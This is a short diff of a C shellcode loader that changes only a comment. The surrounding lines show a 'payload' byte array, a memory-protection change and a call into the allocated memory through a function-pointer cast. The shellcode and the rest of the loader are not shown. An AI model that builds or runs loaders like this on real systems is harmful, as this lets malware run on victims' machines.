@@ -184,7 +184,7 @@ unsigned char payload[] = {
 		printf("Failed to change memory protection (%u)\n", GetLastError());
 		return -2;
 	}
-  // This part is casting alloc_mem to a void(*)() pointer. This means that it's treating the memory allocated by alloc_mem as a function.
+  // Cast a function pointer to our payload.
   ((void(*)())alloc_mem)();
 
 	printf("\n\nalloc_mem : %p\n", alloc_mem);
